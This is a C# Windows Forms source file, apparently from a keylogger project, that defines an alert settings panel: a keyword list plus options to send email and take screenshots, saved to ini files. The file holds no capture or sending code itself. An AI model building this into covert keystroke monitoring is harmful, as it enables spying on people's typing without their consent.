using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using tt;

namespace keylog
{
    public partial class Alert : UserControl
    {
        public Alert()
        {
            InitializeComponent();
        }

        private static List<string> alertList = new List<string>();

        private void bt_add_Click(object sender, EventArgs e)
        {
            Add add = new Add(this);
            add.Show();

            //string s = null;

            //    lbKeywordList.Items.Add(s);
            //    alertList.Add(s);

        }
        delegate void AddListBoxItemCallback(string text);
        public void AddListBoxItem(string item)
        {
            if (this.InvokeRequired)
            {
                AddListBoxItemCallback callback = new AddListBoxItemCallback(AddListBoxItem);
                this.Invoke(callback, new string[] { item });
               
            }
            else
            {
                this.lbKeywordList.Items.Add(item);
                alertList.Add(item);
            }
            
        }


        private void btn_Del_Click(object sender, EventArgs e)
        {
            if (lbKeywordList.SelectedIndex != -1)
            {
                int index = lbKeywordList.SelectedIndex;
                // remove from list alert
                alertList.RemoveAt(index);
                // remove from listbox ListKey
                lbKeywordList.Items.RemoveAt(index);
                if (index - 1 >= 0)
                    lbKeywordList.SelectedIndex = index - 1;
                else if (lbKeywordList.Items.Count > 0)
                    lbKeywordList.SelectedIndex = 0;
            }
        }

        private void btnMR_OK_Click(object sender, EventArgs e)
        {
            Dictionary<string, string> conf = new Dictionary<string, string>();
            if (ckb_sendEmail.Checked )
                conf.Add("SendMail", "true");
            else 
                conf.Add("SendMail", "false");


            if ( ckb_MakeScreenShot.Checked )
                conf.Add("ScreenShot", "true");
            else
                conf.Add("ScreenShot", "false");

            using (StreamWriter file = new StreamWriter("alerts_conf.ini"))
                foreach (var entry in conf)
                    file.WriteLine("{0},{1}", entry.Key, entry.Value);

            // if (File.Exists("alerts_ListOfKey.ini"))
            // {
            //    File.Delete("alerts_ListOfKey.ini");
            using (StreamWriter file = new StreamWriter("alerts_ListOfKey.ini"))
                foreach (var entry in alertList)
                    file.WriteLine(entry);

            // Application.Restart();
            
        }

        private void Alert_Load(object sender, EventArgs e)
        {
            Dictionary<string, string> conf = new Dictionary<string, string>();
            if (File.Exists("alerts_conf.ini"))
            {
                Functions.Load_File("alerts_conf.ini", conf);

                ckb_MakeScreenShot.Checked = Boolean.Parse(conf["ScreenShot"]);
                ckb_sendEmail.Checked = Boolean.Parse(conf["SendMail"]);
            }

            if (File.Exists("alerts_ListOfKey.ini"))
            {
                alertList.Clear();
                StreamReader sr = new StreamReader("alerts_ListOfKey.ini");
                string line;

                while ((line = sr.ReadLine()) != null)
                {
                    lbKeywordList.Items.Add(line);
                    alertList.Add(line);
                }

                sr.Close();
            }
        }

        private void tbKeyword_TextChanged(object sender, EventArgs e)
        {

        }

        //private void btnMR_OK_Click(object sender, EventArgs e)
        //{

        //}
    }
}
